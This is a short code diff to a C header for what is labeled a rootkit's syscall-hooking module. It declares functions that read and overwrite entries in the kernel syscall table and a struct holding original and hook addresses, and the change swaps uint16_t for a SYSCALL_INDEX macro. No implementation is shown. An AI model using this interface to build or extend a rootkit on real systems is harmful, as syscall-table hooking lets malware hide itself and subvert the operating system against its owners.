@@ -1,19 +1,17 @@
-//
-// Created by idan on 1/16/24.
-//
-
 #ifndef ROOTKIT_SYSCALL_HOOKING_H
 #define ROOTKIT_SYSCALL_HOOKING_H
 
+#define SYSCALL_INDEX uint16_t
+
 // simply get the addr stored at the syscall table's index
-unsigned long get_syscall_func(uint16_t syscall_index, unsigned long *sys_call_table);
+unsigned long get_syscall_func(SYSCALL_INDEX syscall_index, unsigned long *sys_call_table);
 
 // simply set an addr at the syscall table's index
-void set_syscall_func(unsigned long func_addr, uint16_t syscall_index, unsigned long *sys_call_table);
+void set_syscall_func(unsigned long func_addr, SYSCALL_INDEX syscall_index, unsigned long *sys_call_table);
 
 // hook handle structure
 struct syscall_hook_handle {
-    uint16_t syscall_index;
+    SYSCALL_INDEX syscall_index;
     unsigned long orig_syscall_addr;
     unsigned long hook_func_addr;
 };
